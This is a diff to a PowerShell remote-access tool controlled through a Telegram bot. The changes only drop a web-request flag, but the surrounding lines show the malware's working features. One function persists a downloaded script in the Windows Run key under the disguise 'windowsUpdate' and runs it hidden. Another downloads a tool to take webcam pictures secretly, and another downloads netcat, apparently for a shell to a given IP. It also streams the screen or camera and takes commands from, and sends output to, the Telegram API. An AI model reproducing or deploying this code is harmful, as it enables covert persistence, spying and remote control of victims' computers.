@@ -57,7 +57,7 @@ function backdoor {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
         
         Send-Message "Downloading.."
-        Invoke-WebRequest -Uri $githubScript -UseBasicParsing -OutFile C:\Temp\windowsUpdate.ps1
+        Invoke-WebRequest -Uri $githubScript -OutFile C:\Temp\windowsUpdate.ps1
 
         Send-Message "Adding_to_the_reg.."
 		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Temp\windowsUpdate.ps1"
@@ -250,7 +250,7 @@ function webcam {
     $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
     $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outpath
+    Invoke-WebRequest -Uri $url -OutFile $outpath
 
     Send-Message "Taking_picture.."
     $args = "/filename C:\Users\$env:username\Documents\image.jpg"
@@ -508,7 +508,7 @@ function netcat($ip) {
     $outpath = "C:\Users\$env:username\Documents\nc.zip"
     $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outpath
+    Invoke-WebRequest -Uri $url -OutFile $outpath
     
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
@@ -538,7 +538,7 @@ function twitch($STREAM_KEY) {
     $outpath = "C:\Users\$env:username\Documents\FFmpeg.zip"
     $outpathUnzip  = "C:\Users\$env:username\Documents\FFmpeg"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outpath
+    Invoke-WebRequest -Uri $url -OutFile $outpath
 
     Send-Message "Starting_streaming.."
     Start-Sleep -Seconds 5
@@ -585,7 +585,6 @@ $payload = @{
     "disable_web_page_preview" = $preview_mode;
 }
 Invoke-WebRequest `
-    -UseBasicParsing
     -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
     -Method Post `
     -ContentType "application/json;charset=utf-8" `
@@ -601,7 +600,7 @@ $LoopSleep = 3
  
  
 #Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
-$BotUpdates = Invoke-WebRequest -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
+$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
 $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
 $LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
  
@@ -621,7 +620,7 @@ While ($DoNotExit)  {
   $Message = ""
   
   #Get the current Bot Updates and store them in an array format to make it easier
-  $BotUpdates = Invoke-WebRequest -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
+  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
   $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
   
   #Get just the last message:
@@ -673,7 +672,6 @@ While ($DoNotExit)  {
 	  }
       "/list"  {
         Invoke-WebRequest `
-        -UseBasicParsing
         -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
         -Method Post `
         -ContentType "application/json;charset=utf-8" `
